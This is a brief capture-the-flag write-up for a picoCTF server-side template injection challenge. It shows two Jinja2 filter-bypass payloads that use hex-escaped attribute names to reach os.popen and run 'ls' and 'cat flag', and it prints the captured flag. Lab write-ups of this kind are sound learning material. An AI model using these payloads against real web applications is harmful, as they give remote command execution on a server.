# challenge WEB 6: SSTI2
![image](https://github.com/user-attachments/assets/87a4f29b-041e-451c-abd9-57b7b0c72a84)

This is also an SSTI vulnerability like the previous SSTI post we did, but getting past the filter is much more difficult.

I also tried many ways to determine what template engine it is but it filtered all my payload, I am very helpless, I also tried many ways to determine what template engine it was but it filtered all my payloads, I was helpless. After a while I searched Google and tried to bypass it in a paragraph (https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)
![image](https://github.com/user-attachments/assets/337b771f-dcc4-4b39-83cf-3ccc19db7b3d)

and i successfully: 
![image](https://github.com/user-attachments/assets/a6cf66ac-304a-4257-af4b-e578362f90c7)

next we use ls and cat flag we will have flag:

{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}
![image](https://github.com/user-attachments/assets/892be265-0b4d-4304-83a7-7eab0562e855)


{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
![image](https://github.com/user-attachments/assets/78bcbe6a-fc93-4d6d-8296-b4c117cf23f6)

Probem Solved: picoCTF{sst1_f1lt3r_byp4ss_0ef4bd3d}
